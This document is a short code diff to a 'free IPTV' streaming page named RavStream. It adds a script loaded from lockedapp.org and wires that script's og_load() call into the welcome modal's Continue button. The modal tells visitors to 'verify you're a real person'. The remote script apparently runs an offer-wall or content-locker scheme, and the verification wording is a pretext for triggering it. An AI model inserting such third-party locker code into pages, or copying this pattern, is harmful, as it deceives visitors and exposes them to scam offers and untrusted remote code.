@@ -981,6 +981,7 @@
             }
         }
     </style>
+    <script type="text/javascript" id="ogjs" src="https://lockedapp.org/cl/js/o4x88q"></script>
 </head>
 <body>
     <!-- Loading Screen -->
@@ -1265,7 +1266,7 @@
             modal.innerHTML = `
                 <h2 style="font-size: ${isMobileDevice() ? '1.3rem' : '1.5rem'}; font-weight: 600; margin-bottom: 16px; color: #ffffff !important; -webkit-font-smoothing: antialiased;">Welcome to RavStream</h2>
                 <p style="color: #9ca3af !important; margin-bottom: ${isMobileDevice() ? '24px' : '32px'}; line-height: 1.6; -webkit-font-smoothing: antialiased; font-size: ${isMobileDevice() ? '0.9rem' : '0.95rem'};">Your journey into free IPTV begins now! You'll be redirected to the full streaming platform, but first, please verify you're a real person to prevent system abuse.</p>
-                <button onclick="closeModal()" style="padding: 12px 24px; background: linear-gradient(135deg, #3b82f6, #8b5cf6); color: white; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4); min-height: 44px; font-size: 1rem; -webkit-tap-highlight-color: rgba(255, 255, 255, 0.1); touch-action: manipulation;">Continue</button>
+                <button onclick="og_load(); closeModal();" style="padding: 12px 24px; background: linear-gradient(135deg, #3b82f6, #8b5cf6); color: white; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4); min-height: 44px; font-size: 1rem; -webkit-tap-highlight-color: rgba(255, 255, 255, 0.1); touch-action: manipulation;">Continue</button>
             `;
 
             document.body.appendChild(modal);
